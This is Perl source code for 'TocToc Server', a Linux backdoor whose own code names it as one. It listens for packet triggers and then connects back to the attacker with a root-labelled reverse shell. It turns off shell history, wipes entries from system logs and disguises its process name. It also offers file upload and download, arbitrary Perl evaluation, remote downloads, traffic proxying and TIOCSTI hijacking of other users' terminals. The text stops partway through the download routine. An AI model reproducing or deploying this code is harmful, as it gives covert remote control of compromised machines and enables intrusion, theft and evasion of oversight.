   #!/usr/bin/perl
   # TocToc Server 1.7.01-BETA2
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrixteam.net
   #
   #
   #######################################################################
   #######                     CONFIGURATION                       #######
   #######################################################################
   my $proc_name='TocToc';           # process name                      #
   #---------------------------------#####################################
   my $pdev = $ARGV[0] || "";        # extern interface - if none        #
                                     # especifyed it will be looked up   #
   #---------------------------------#####################################
   my $pass = 'CRYPTED PASSWORD';    # Crypted password                  #
   #---------------------------------#####################################
   my $home = "/";                   # HOME directory                    #
   #---------------------------------#####################################
   my $shell = "/bin/bash";          # Shell bin location                #
   #---------------------------------#####################################
   my @commands = (                  # Commands to be executed before    #
   'cat /etc/issue.net 2> /dev/null',# run $shell you can also use ';'   #
   'id',                             # to separate them, E.g:            #
   'uname -a');                      # my @commands = ('id;uname -a');   #
   #---------------------------------#####################################
   my @bashrc = (                    # The bashrc lines gonna be written #
     'alias ls=\'ls $LS_OPTIONS\''   # in "$home/.bashrc before a shell  #
   );                                # be spawned and deleted after it   #
   #---------------------------------#####################################
   my $max_idle = 40;                # Max. time in minutes a user can   #
                                     # be idle.                          #
   #---------------------------------#####################################
   my $pid_file = "$home/.toc.pid";  # PID file gonna be written if      #
                                     # especifyed                        #
   #---------------------------------#####################################
   my $Hertz = 100;                  # Kernel clock tick rate to convert #
                                     # the start time of a process into  #
                                     # the UNIX epoch time. 100 is the   #
                                     # Linux standard, you can also look #
                                     # in /usr/include/asm/param.h for   #
                                     # its value. Not necessary, thougth #
   #---------------------------------#####################################
   my %WIPE;                         #      - WIPE definetions  -        #
   $WIPE{"/var/log/messages"}        # $WIPE{"some_file"} = "what to     #
   = "obsolete promisc";             # wipe";                            #
                                     # In the TocToc startup the lines   #
                                     # with words in the key value gonna #
                                     # be wiped off from the file        #
   #######################################################################

   ####################################
   # You can change the ENV stuff too #
   ####################################

   #### ENVironment ####
   $ENV{HOME}       = $home;
   $ENV{PS1}        = '[\u@\h \W]: '; # the way i like :)
   $ENV{MAIL}       = '/var/mail/root';
   $ENV{HISTFILE}   = '/dev/null';
   $ENV{USER}       = 'root';
   $ENV{LOGNAME}    = 'root';
   $ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';
   $ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';
   $ENV{SHELL}      = $shell;
   $ENV{TERM}       = 'xterm';
   #####################

   ########################################
   # Probably you don´t wanna change that #
   ########################################

   # DO NOT ADD SIG{INT} HERE
   ###### SIGnals ######
   $SIG{HUP}  = 'IGNORE';
   $SIG{TERM} = 'IGNORE';
   $SIG{CHLD} = sub { wait; };
   #####################

   ####################################
   ### Don´t make any change unless ###
   ### you know what your are doing ###
   ####################################

   my $UPTIME = time;
   my $buffer = 4096;
   $0=$proc_name."\0";
   my $pid=fork;
   exit if $pid;

   use Cwd;
   my $dir = getcwd();
   chdir("/") if ($dir ne '/');

   # Modules needed #
   use Net::RawIP;
   use IO::Socket;
   use IO::Pty;
   use IO::Handle;
   use IO::Stty;
   use IO::Socket;
   use IO::Select;
   use Term::ReadKey;
   use LWP::UserAgent;
   use Time::HiRes;
   use Sys::Hostname;
   ##################

   # to use ioctl
   eval {
     require 'sys/ioctl.ph';
   };

   use strict;

   chdir("/");
   if (defined($pid_file) and $pid_file ne '') {
     open(PID, "> $pid_file");
     print PID "$$\n";
     close(PID);
   }
   my $VERSION = "1.7.01-BETA2";
   $max_idle *= 60;
   my $psize = 4096;
   my $ptout = 64;
   my $ip = 20;
   my (%c_ipt, @p, %pd);

   $pdev=Net::RawIP::lookupdev($ptout) unless $pdev;
   my $ifs = ifaddrlist;
   my $LIP = $ifs->{$pdev};
   my $pfil = "tcp and ( dst host $LIP ) or udp and ( dst host $LIP ) or icmp and ( dst host $LIP )";

   my $c=0;
   my $p=new Net::RawIP({ip=>{},udp=>{}});
   #my $p=new Net::RawIP();
   my $okp;
   my $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);
   my $offset=Net::RawIP::linkoffset($psck);
   exit if (!$offset);


   pipe(CHILD_RDR, PARENT_WTR);

   my $pid = fork();
   exit if (not defined($pid));

   unless ($pid) {
     if (defined($pid_file) and $pid_file ne '') {
       open(PID, ">> $pid_file");
       print PID "$$\n";
       close(PID);
     }
     my $main_pid = $$;
     chdir("$home");

     close(PARENT_WTR);

     CHILD_RDR->autoflush(1);
     my $rdr = new IO::Handle;
     $rdr->fdopen(fileno(CHILD_RDR), 'r');
     $rdr->blocking(0);

     my %CLIENT;

     my $connections = 0;

     my $sel_serv = IO::Select->new();
     my $sel_shell = IO::Select->new();

     my $rdr_buf = '';
     while ( 1 ) {
       if ($connections == 0) {
         sleep(2); # dont waste cpu when not needed
       } else {
          foreach my $cli (keys(%CLIENT)) {
            my $idle_time = time - $CLIENT{$cli}->{last_msg};
            finish_client($CLIENT{$cli}->{sock}, "\n\nIdle time exceeded.\n\n") if ($idle_time > $max_idle);
          }
       }


       if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {
         rdr_parse("$rdr_buf");
         $rdr_buf = '';
       }

       my @ready = $sel_serv->can_read(0.01);
       foreach my $fh (@ready) {
         my $msg;
         my $nread = sysread($fh, $msg, 4096);

         my $proto_cli;
         map { $proto_cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{proto} eq $fh) } keys %CLIENT;

         if ($nread == 0) {
           if (defined($CLIENT{$fh})) {
             close_client($fh);
           } elsif (defined($proto_cli)) {
              close_client($proto_cli);
           }
         } elsif (not defined($CLIENT{$fh})) {
             # protocols messages
             next unless(defined($proto_cli));
             parse_msg($proto_cli, $msg);
         } elsif ($CLIENT{$fh}->{logged} == 1) {
             $CLIENT{$fh}->{last_msg} = time;
             write_shell($CLIENT{$fh}->{shell}, $msg);
         }
       }
       my @shell_ready = $sel_shell->can_read(0.01);
       foreach my $shell (@shell_ready) {
         read_shell($shell);
       }
     }

   ##############
   # CHILD SUBS #
   ##############
     sub rdr_parse {
       my $msg = shift;
       my @lines = split(/\n/, $msg);
       foreach my $line (@lines) {
         if ($line =~ /^CONN (.*)/) {
           open_conn(split(':',$1));
         }
       }
     }

     sub open_conn {
       my ($ip, $port) = @_;
       my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);
       $sock->autoflush(1);
       $connections++;
       $sel_serv->add($sock);
       $CLIENT{$sock}->{sock} = $sock;

       $CLIENT{$sock}->{logged} = 1;
       $CLIENT{$sock}->{login_time} = time;
       $CLIENT{$sock}->{last_msg} = time;
       new_shell($sock);

       # opening the protocol socket
       my $proto = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7);
       unless($proto) {
         write_client($sock, "\nShit! The protocol connection could not be estabilished!\nTry to reconnect.\n");
       } else {
           $CLIENT{$sock}->{proto} = $proto;
           $sel_serv->add($proto);
       }
     }

     sub read_shell {
       my $shell = shift;
       my $cli;

       unlink("$home/.bashrc") if (-e "$home/.bashrc"); # here we check and delete
                                                        # the bashrc file

       my $msg = '';
       map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys %CLIENT;

       return(undef) unless(defined($cli)); # ???

       my $read = sysread($shell, $msg, $buffer);

       if ($read == 0) {
         finish_client($cli, "Terminal closed.\n");
         $shell->close;
         $sel_shell->remove($shell);
       } else {
          write_client($cli, $msg);
       }
     }

     sub new_shell {
       my $cli = shift;
       my $pty = new IO::Pty;

       my $bashrc_file = "$home/.bashrc";
       $bashrc_file =~ s/^\/\//\//;

       unless ($pty) {
         finish_client($cli, "ERRO: There is no device available.\n");
       }

       my $pid = fork();
       $CLIENT{$cli}->{SHELL_PID} = $pid;

       if (not defined($pid)) {
         finish_client($cli, "ERRO: fork()\n");
       }


       unless ($pid) {

         $pty->make_slave_controlling_terminal();
         my $slave = $pty->slave();
         close $pty;

         $slave->set_raw();
         unless (open(STDIN,"<&". $slave->fileno())) {
           finish_client($cli,"Couldn't reopen STDIN for reading.\n");
           exit;
         }
         unless (open(STDOUT,">&". $slave->fileno())) {
            finish_client($cli, "Couldn't reopen STDOUT for writing.\n");
            exit;
         }
         unless (open(STDERR,">&". $slave->fileno())) {
           finish_client($cli, "Couldn't reopen STDERR for writing.\n");
           exit;
         }

         STDOUT->autoflush(1);
         STDIN->autoflush(1);
         STDERR->autoflush(1);

         close $slave;

         ReadMode 0;
         sleep 1;
         IO::Stty::stty(\*STDIN,"sane");

         chdir("$home");

         my $command = join(';', @commands);
         if (defined($command)) {
           system("$command &"); # '&' to execute it in backgroud
           sleep(1); # to get the commands answer
                     # i hope 1 sec is enougth
         }

         # writing out .bashrc
         open(BRC, "> $bashrc_file");
         print BRC join("\n", @bashrc);

         { exec("$shell") };

         syswrite(STDOUT, "ERRO: exec($shell)\n");
         exit;
       }
       $pty->close_slave();
       $pty->set_raw();
       $CLIENT{$cli}->{shell} = $pty;
       $sel_shell->add($pty);

     }

     sub parse_msg {
       my ($cli, $msg) = @_;
       my $shell = $CLIENT{$cli}->{shell};
       my $proto = $CLIENT{$cli}->{proto};
       if ($msg =~ /\001T:(.+?)\s(.*):\002\n/) {
         while ($msg =~ m/\001T:(.+?)\s(.*):\002\n/g) {
           my $cmd  = $1;
           my $arg  = $2;
           my @args = split(/ +/, $arg);
           if ($arg eq "ABORT") {
             if ($cmd eq "DOWNLOAD") {
               my $pipe = $CLIENT{$cli}->{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}->{DOWNLOAD_PIPE}));
               if (defined($pipe)) {
                  print $pipe "ABORT\n";
                  close($pipe);
                  delete($CLIENT{$cli}->{DOWNLOAD_PIPE});
               }
   #          } elsif ($cmd eq "OPEN") {
   #              exit if ($$ != $main_pid);
             }
             next;
           }
           if ($cmd eq "TERM_SIZE") {
             return() if (not defined($shell) or scalar(@args) != 4);

             eval { SetTerminalSize(@args, $shell); };

             if (defined($CLIENT{$cli}->{termsize})) {
               write_client($cli, "\nTerminal size has changed.\n\n");
             }
             $CLIENT{$cli}->{termsize} = "@args";

           } elsif ($cmd eq "HIJACK") {
               my $chars = join(" ", @args[1 .. $#args]);
               hijack($proto, $args[0], $chars);
           } elsif ($cmd eq "SYSINFO") {
               my $hostname = hostname;
               my %CPU = cpuinfo();
               my %MEM = meminfo();
               my $uptime = uptime();
               my $bd_uptime = stat_time(time-$UPTIME, "d");
               my $cpu_load = sysload();
               my $OS = ucfirst($^O);
               my ($received, $sended) = netinfo();

               opendir(PROC, "/proc");
               my @procs = readdir(PROC);
               closedir(PROC);
               @procs = grep { $_ ne "." and $_ ne ".." and $_ =~ /^\d+$/ } @procs;

               my $procs = scalar(@procs);

               my $kernel = "Error: Could not open /proc/version";
               open(VER, "< /proc/version");
               my @version = split(/ /, <VER>);
               close(VER);
               $kernel = $version[2] if (defined($version[2]));

               my @release_files = ("versão-conectiva", "mandrake-release", "redhat-release", "debian_version", "SuSE-release", "slackware-version", "release", "version");

               my $release;
               my $release_file;
               foreach my $file (@release_files) {
                 if (-e "/etc/$file") {
                   $release_file = "/etc/$file";
                   last;
                 }
               }

               unless ($release_file) {
                 opendir(ETC, "/etc");
                 my @files = readdir(ETC);
                 closedir(ETC);
                 my ($release_file) = grep { $_ =~ /release|version/ } @files;
                 $release_file = "/etc/".$release_file;
               }

               if ($release_file) {
                 open(REL, "< $release_file");
                 $release = <REL>;
                 close(REL);
               }

               $release = "Slackware $release" if ($release_file eq "/etc/slackware-version");
               $release = "Debian GNU/Linux $release" if ($release_file eq "/etc/debian_version");

               if ($release_file and !(grep { $release_file eq "/etc/$_" } @release_files)) {
                 $release = "Guess $release" unless(grep { $release_file eq "/etc/$_" } @release_files);
               }
               $release = "[$release]" if ($release ne "");

               $release =~ s/\n$//;

               my @send = (
                       "Hostname:               $hostname",
                       " ",
                       "Operation System:       $OS $release",
                       "Kernel version:         $kernel",
                       " ",
                       "System UPTime:          $uptime",
                       "BackDoor UPTime:        $bd_uptime",
                       " ",
                       "CPUs Number:            ".$CPU{CPUS},
                       "CPU Load:               $cpu_load");


               for (my $c = 1; $c <= $CPU{CPUS}; $c++) {
                  my $cpun = $c;
                  $cpun = '' if ($c == 1);
                  my $space = " " x (3-length($cpun));
                  push(@send, ("CPU$cpun MHz:             $space".$CPU{$c}{'cpu MHz'},
                               "CPU$cpun Vendor ID:       $space".$CPU{$c}{'vendor_id'},
                               "CPU$cpun Model name:      $space".$CPU{$c}{'model name'}));
               }

               push(@send, (" ",
                            "Memory Total:           ".int($MEM{'MemTotal'}/1000)." MB",
                            "Memory Free:            ".int($MEM{'MemFree'}/1000)." MB",
                            " ",
                            "Running process:        $procs",
                            " ",
                            "INet Device:            $pdev",
                            "Received bytes:         $received",
                            "Sended bytes:           $sended"));



             foreach my $send (@send) {
               spm($proto, $cmd, $send);
             }
             spm_done($proto, $cmd);
           } elsif ($cmd eq "W") {
               my %PROC = w_procps();

               spm($proto, $cmd, "USER          TTY           FROM     LOGGED    IDLE  WHAT");

               foreach my $cli (keys(%CLIENT)) {
                 my $cli_sock = $CLIENT{$cli}->{sock};
                 my $cli_shell = $CLIENT{$cli}->{shell};

                 my $idle = time - $CLIENT{$cli}->{last_msg};
                 my $show_idle = stat_time($idle);

                 my $login = time - $CLIENT{$cli}->{login_time};
                 my $show_login = stat_time($login, "h");
                 my $ttyname = $cli_shell->ttyname;
                 $ttyname =~ /^\/dev\/(.*)/;
                 my $pts = $1;

                 my $show_starttime = stat_time((time-$PROC{$ttyname}{starttime}), "h");

                 my $user = getpwuid($PROC{$ttyname}{UID});

                 my $line = $user.(" " x (10-(length($user)))).fill_space($pts, 7).fill_space($cli_sock->peerhost, 15).fill_space($show_login, 11).fill_space($show_idle, 8)."  ".$PROC{$ttyname}{cmd};

                  spm($proto, $cmd, $line);
               }
               spm_done($proto, $cmd);
           } elsif ($cmd eq "VERSION") {
               spm_done($proto, $cmd, "TocToc $VERSION by 0ldW0lf (oldwolf\@atrixteam.net)");
           } elsif ($cmd eq "GET") {
               sendfile($cli, @args);
           } elsif ($cmd eq "PUT") {
               getfile($cli, @args);
           } elsif ($cmd eq "EVAL") {
               my $ret = eval "$arg";
               spm_done($proto, $cmd, "Evaluation returned: $ret");
           } elsif ($cmd eq "SOCKLIST") {
               socklist($proto, "$arg");
               spm_done($proto, $cmd);
           } elsif ($cmd eq "PWD") {
               my $dir = getcwd();
               spm_done($proto, $cmd, "$dir");
           } elsif ($cmd eq "LAG") {
               spm_done($proto, $cmd, $arg);
   #        } elsif ($cmd eq "OPEN") {
   #            sopen($cli, @args);
   #        } elsif ($cmd eq "OPEN2") {
   #            sopen2($cli, @args);
           } elsif ($cmd eq "OPEN") {
               sopen2($cli, @args);
           } elsif ($cmd eq "CD") {
               if (chdir("$arg")) {
                 my $dir = getcwd();
                 spm($proto, $cmd, "Changed directory to: $dir");
               } else {
                  spm($proto, $cmd, "I could not change directory to: $arg");
               }
               spm_done($proto, $cmd);
           } elsif ($cmd eq "DOWNLOAD") {
               my ($url, $file) = @args;
               my $pwd = getcwd();
               unless(defined($file)) {
                 $file = $url;
                 $file =~ s/^.*\/(\S+)$/$1/;
               }
               $file = "$pwd/$file";
               $file =~ s/^\/\//\//;

               unless(open(FILE, "> $file")) {
                 spm_done($proto, $cmd, "Error: Cannot creat $file");
                 next;
               }

               close(FILE);
               unless(download($cli, $url, $file))  {
                 spm_done($proto, $cmd, "Error: I could not fork() the process.");
                 next;
               }
           } elsif ($cmd eq "PS") {
               my @ps = ps();
               if (scalar(@ps) == 0) {
                 spm_done($proto, $cmd, "None hidden procces has been found.");
               } else {
                  foreach my $ps (@ps) {
                    spm($proto, $cmd, "$ps");
                  }
                  spm_done($proto, $cmd);
               }
           } else {
              spm_done($proto, $cmd, "Error: Command \'$cmd\' not implemented in this version ($VERSION).");
           }

         }
       }
     }

     sub netinfo {
        my ($bytes_in, $bytes_out);
        open(NET, "< /proc/net/dev");
        while (<NET>) {
          if (/^.+?$pdev\:.+?(\d+)\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+(\d+)/) {
            $bytes_in = $1;
            $bytes_out = $2;
            last;
          }
        }
        close(NET);

        if ($bytes_in < 1024**3) {
           $bytes_in = sprintf("%.02f",$bytes_in / 1024**2)." M";
        } else {
           $bytes_in = sprintf("%.02f", $bytes_in / 1024**3)." G";
        }
        if ($bytes_out < 1024**3) {
           $bytes_out = sprintf("%.02f",$bytes_out / 1024**2)." M";
        } else {
           $bytes_out = sprintf("%.02f", $bytes_out / 1024**3)." G";
        }

        return($bytes_in, $bytes_out);
     }

     sub sysload {
       open(LOAD, "< /proc/loadavg") || return("Error: I could not open /proc/loadavg");
       my $load = <LOAD>;
       close(LOAD);
       $load =~ /^(.+?)\s+/;
       return($1);
     }

     sub uptime {
       open(UPT, "< /proc/uptime") || return("Error: I could not open /proc/uptime");
       my $uptime = <UPT>;
       close UPT;

       $uptime =~ /^(.+?)\s+(.*)/;
       my $s = int($1);
       return(stat_time($s, "d"));
     }

     sub meminfo {
       my %MEM;

       open(MEM, "< /proc/meminfo") || return("Error: I could not open /proc/meminfo");

       while (<MEM>) {
         next unless (/^(.+?)\:\s+(\d+)/);
         $MEM{$1} = $2;
       }

       close(MEM);
       return(%MEM);
     }

     sub cpuinfo {
       my %CPU;

       my $cpu_counter = 0;
       open(CPU, "< /proc/cpuinfo") || return("Error: I could not open /proc/cpuinfo");

       while (<CPU>) {
         if (/^processor/) {
           $cpu_counter++;
         } else {
            next unless (/^(.+?)\s+\:\s+(.*?)\n$/);
            $CPU{$cpu_counter}{$1} = $2;
         }
       }
       close(CPU);

       $CPU{CPUS} = $cpu_counter;
       return(%CPU);
     }

     sub spm_done {
        my ($proto, $cmd, $msg) = @_;
        if (defined($msg)) {
          spm($proto, $cmd, $msg);
        }
        spm($proto, $cmd, "DONE");
     }

     sub spm {
       my ($proto, $cmd, $ans) = @_;
       my $send = "\001T:$cmd $ans:\002\n";
       syswrite($proto, $send, length($send));
     }

     sub ps {
        my @result;

        opendir(DIR, "/proc");
        my @proc= readdir(DIR);
        closedir(DIR);
        @proc = grep { -d "/proc/".$_  and $_ =~ /^\d+$/ } @proc;

        my @ps = `ps ax`;
        @ps = grep { s/^(|\s+)(\d+).*\n/$2/ } @ps;

        foreach my $pid (@proc) {
           next if (grep { $_ eq $pid } @ps);

           open(CMD, "/proc/$pid/cmdline");
           my $cmd = <CMD>;
           close(CMD);

           $cmd =~ s/\0/ /g;
           $cmd =~ s/\s+$//;
           my $dir = readlink("/proc/$pid/cwd");

           push(@result, "PID: $pid ($cmd) [$dir]");
        }
        return(@result);
     }

   # THIS FUNCTION WAS REMOVED
   # READ THE CLIENT
   #
   #  sub sopen {
   #    my ($cli, $ip, $port) = @_;
   #    my $proto = $CLIENT{$cli}->{proto};
   #
   #    my $open_sock = IO::Socket::INET->new(PeerAddr => "$ip", PeerPort => "$port", Timeout => 15);
   #
   #    unless($open_sock) {
   #      print $proto "\003FINISHED-I could not connect on $ip:$port\002";
   #      return();
   #    }
   #
   #    $open_sock->autoflush(1);
   #    my $pid = fork();
   #
   #    if (not defined($pid)) {
   #       print $proto "\003FINISHED-Error on fork()\002";
   #    }
   #
   #    unless ($pid) {
   #
   #      my $sel = IO::Select->new($open_sock);
   #      $sel->add($proto);
   #
   #      while ( 1 ) {
   #        foreach my $fh ($sel->can_read(0.1)) {
   #          my $msg;
   #          my $nread = sysread($fh, $msg, $buffer);
   #
   #          if ($nread == 0) {
   #            if ($fh eq $proto) {
   #               $open_sock->close() if ($open_sock);
   #            } else {
   #               print $proto "\003FINISHED-Connection closed.\002";
   #            }
   #            $sel->remove($proto);
   #            $sel->remove($open_sock);
   #            undef($sel);
   #            exit;
   #          }
   #
   #          if ($fh eq $proto) {
   #             if ($msg =~  /\001T:.*:\002\n/) {
   #               parse_msg($cli, $msg);
   #             } else {
   #                syswrite($open_sock, $msg, length($msg));
   #             }
   #          } else {
   #              syswrite($proto, $msg, length($msg));
   #          }
   #
   #        }
   #      }
   #      exit; # ???
   #    }
   #
   #  }

     sub sopen2 {
       my ($cli, $ip, $port, $cli_port) = @_;
       my $cli_host = $cli->peerhost;

       my $pid = fork();

       unless($pid) {

         my $sock = IO::Socket::INET->new(PeerAddr => $cli_host, PeerPort => $cli_port, Proto => "tcp", Timeout => 15) || exit;
         $sock->autoflush(1);
    #     print "conectando cliente $cli_host:$cli_port\n";
         my $sel = IO::Select->new($sock);
         my $remote;

         my $go = 0;

         while ( 1 ) {
           foreach my $fh ($sel->can_read(0.01)) {
              my $msg;
              my $nread = sysread($fh, $msg, $buffer);

              if ($nread == 0) {
                 sleep(1);
                 $sel->remove();
                 $sock->close() if ($sock);
                 $remote->close() if ($remote);
                 exit;
              }

              if ($fh eq $sock) {
                if ($go == 0) {
   #               print "conectando -> $ip:$port\n";
                  $remote = IO::Socket::INET->new(PeerAddr => $ip, PeerPort => $port, Proto => "tcp");
                  unless ($remote) {
                    print $sock "I could not connect on $ip:$port\n";
                    $sel->remove();
                    $sock->close() if ($sock);
                    exit;
                  }
                  $sel->add($remote);
                  $go = 1;
                } else {
                   syswrite($remote, $msg, length($msg));
                }
              } else {
                  syswrite($sock, $msg, length($msg));
              }
           }
         }
       }
     }

     sub hijack {
       my ($cli, $device, $msg) = @_;
       unless(open(TTY, "+>$device")) {
         spm_done($cli, "HIJACK", "I could not open tty $device");
         return();
       }

       # i hope it works
       unless (defined(&TIOCSTI)) {
         spm($cli, "HIJACK", "WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).");
         eval 'sub TIOCSTI () {0x5412;}';
         spm_done($cli, "HIJACK");
         close(TTY);
         return();
       }

       $msg .= "\n";

       foreach my $char (split('', $msg)) {
         spm($cli, "HIJACK", "Hey yo! I couldn't write on $device: $!")
         unless (ioctl(TTY, &TIOCSTI, $char));
       }
       close(TTY);
       spm_done($cli, "HIJACK");
     }

     sub getfile {
        my ($cli, $file, $port) = @_;

        my $pid = fork();
        return(undef) if (not defined($pid));
        unless ($pid) {
          my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => 'tcp', Timeout=> 10);
          exit unless($transfer);
          $transfer->autoflush(1);

          my $OK = 1;
          if (-e "$file") {
            syswrite($transfer, "File already exists.", 20);
            $OK = 0;
          }
          unless (open(FILE, "> $file")) {
            syswrite($transfer, "I could not open the file.", 26);
            $OK = 0;
          }

          syswrite($transfer, "OK", 2) if ($OK == 1);
          sleep(1);

          my $msg;
          my $got_info = 0;
          my $bytes = 0;

          while ( 1 ) {
             my $ready = sysread($transfer, $msg, $buffer);
             if ($ready == 0) {
                close(FILE);
                exit;
             }
             if ($got_info == 0) {
               $got_info = 1;
               my $pack = pack("N", 0);
               syswrite($transfer, $pack, length($pack));
               next;
             }
             print FILE $msg;
             $bytes += length($msg);
             my $got_bytes = pack("N", $bytes);
             syswrite($transfer, $got_bytes, length($got_bytes));
          }

          exit;
        }
     }


     sub sendfile {
        my ($cli, $file, $port) = @_;

        my $pid = fork();
        return(undef) if (not defined($pid));
        unless ($pid) {
   #       print "pid forcado\n";
          my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => 'tcp', Timeout=> 10);#       print "opa.. vamu v\n";
          exit unless($transfer);
   #       print "eh eh conectado\n";
          $transfer->autoflush(1);

          unless (-e "$file") {
             syswrite($transfer, "File not found.", 15);
          }
          unless (open(FILE, "< $file")) {
            syswrite($transfer, "I could not open the file.", 26);
          }

          my $bytes = (stat("$file"))[7];
          syswrite($transfer, $bytes, length($bytes));

          my $msg;
   #       print "humm vo comeca a manda o arkivo\n";
          while ( 1 ) {
             my $ready = sysread($transfer, $msg, $buffer);
             if ($ready == 0) {
               close(FILE);
               exit;
             }
             my $sended_bytes = unpack("N", $msg);
             seek(FILE, $sended_bytes, 0);
             my $send_bytes;
             read(FILE, $send_bytes, 1024);
             syswrite($transfer, $send_bytes, length($send_bytes));
          }

          exit;
        }
     }

     # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997
     # adapted for TocToc use
     sub socklist {
       my ($proto, $protocol) = @_;
       undef($protocol) if ($protocol eq "0" );

       my $init = 0;

       my %sock_proc;
       opendir (PROC, "/proc") || spm($proto, "SOCKLIST", "Error: Could not open /proc");
       for my $f (readdir(PROC)) {
           next if (! ($f=~/[0-9]+/) );
           if (! opendir (PORTS, "/proc/$f/fd")) {
               closedir PORTS;
               next;
           }
           for my $g (readdir(PORTS)) {
               next if (! ($g=~/[0-9]+/) );
               my $r=readlink("/proc/$f/fd/$g");

               my ($dev,$ino)=($r=~/^(socket|\[[0-9a-fA-F]*\]):\[?([0-9]*)\]?$/);

               if ($dev == "[0000]" || $dev == "socket") {$sock_proc{$ino}=$f.":".$g;}    }
           closedir PORTS;
       }
       closedir PROC;

       sub scheck {
         open(FILE,"/proc/net/".$_[0]) || spm($proto, "SOCKLIST", "Error: Could not open file /proc/net/".$_[0]." for reading.");
         while (<FILE>) {
             my @F=split();
             next if ($F[9]=~/uid/);
             my @A=split(":",$F[1]);
             my $a=hex($A[1]);
             my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);
             my $cmd = "";
             if ($pid && open (CMD,"/proc/$pid/status")) {
                my $l = <CMD>;
                ($cmd) = ( $l=~/Name:\s*(\S+)/ );
                close(CMD);
             }
             if ($init == 0 ) {
                 spm($proto, "SOCKLIST", "type  port      inode     uid    pid   fd  name");
                 $init = 1;
             }
             my $string = sprintf("%s %6d %10d  %6d %6d %4d  %s", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);
             spm($proto, "SOCKLIST", $string);
         }
         close(FILE);
       }
       if (not defined($protocol)) {
         scheck("tcp");
         scheck("udp");
         scheck("raw");
       } elsif (grep { $_ eq $protocol } ("tcp", "udp", "raw")) {
           scheck("$protocol");
       } else {
          spm($proto, "SOCKLIST", "Error: protocol ".uc($protocol)." not found in the list (UDP, TCP, RAW)");
       }

     }

     sub download {
       my ($cli, $link, $file) = @_;

       my $proto = $CLIENT{$cli}->{proto};

       pipe(RDR, WTR);
       WTR->autoflush(1);
       RDR->autoflush(1);

       $CLIENT{$cli}->{DOWNLOAD_PIPE} = \*WTR;

       my $pid = fork();
       return(undef) if not defined($pid);

       unless($pid) {
         close(WTR);
         unless(open(FILE, "> $file")) {
           spm_done($proto, "DOWNLOAD", "I could not open $file for writting");
           exit;
         }

         my $first = 1;

         my $init_time = Time::HiRes::time;
         my $saved_data = 0;
         if ($link =~ /^http/i) {
           my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );
           my $req = new HTTP::Request GET => $link;

           my $res = $ua->request($req,\&http_save_data, 4096);
           $init_time = Time::HiRes::time;
           if ($res->header("X-Died") || !$res->is_success) {
             spm($proto, "DOWNLOAD", "Error: Download was interrupted by peer.");
           } else {
              spm($proto, "DOWNLOAD", "Download finished, file $file has been saved.");
           }
         } elsif ($link =~ /^ftp/i) {
             $link =~ s/^ftp:\/\///;
             $link =~ /(.+?)\/(.*)/;
             my $host = $1;
             my $file = $2;
             my $save = $link;
             $save =~ s/.*\/(.+?)$/$1/;

             unless ($host or $file) {
               spm_done($proto, "DOWNLOAD", "Unrecognized ftp link");
               exit;
             }
             my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => 21, Proto => "tcp", Timeout => 15);
             unless ($sock) {
               spm_done($proto, "DOWNLOAD", "Error: I could not connect on host ($host:21)");
               exit;
             }

             my $logado = 0;
             print $sock "USER anonymous\nPASS anonymous\@anonymous.com\n";
             my ($size, $trans);

             while (<$sock>) {
                my $buf = $_;
                $buf =~ s/\n//;
                if ($buf =~ /^230/ and $logado == 0) {
                  $logado = 1;

                  print $sock "TYPE I\nPASV\nRETR $file\n";
                } elsif ($buf =~ /^150.+?\((\d+)\s.+?\)/) {
                   $size = $1;
                   $init_time = Time::HiRes::time;
                   my $saved_data = 0;
                   open(FILE, "> $save");
                   while (<$trans>) {
                     print FILE $_;
                     $saved_data += length($_);
                     gotta_die();
                     if ($first == 1) {
                       spm($proto, "DOWNLOAD", "Stats: Downloading $link ($size size). Type ^C to abort");
                       $first = 0;
                     } else {
                        ProgressBar($cli, $init_time, $saved_data, $size);
                     }
                   }
                   close(FILE);
                   print $sock "QUIT\n";
                   last;
                } elsif ($buf =~ /^530/ and $logado == 1) {
                    spm_done($proto, "DOWNLOAD", "Error: File not found.");
                    exit;
                } elsif ($buf =~ /^227.+?\((.*)\)/) {
                    my @info = split(',', $1);
                    my $host = join('.', @info[0 .. 3]);
                    my $port = $info[4] * 256 + $info[5];
                    $trans = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "$port", Proto => "tcp");
                    unless ($trans) {
                      spm_done($proto, "DOWNLOAD", "Error: I could not estabilish the transfer connection");
                      exit;
                    }
                }
             }
         } else {
            spm($proto, "DOWNLOAD", "Link MUST begin with http:// or ftp://");
         }

         spm_done($proto, "DOWNLOAD");
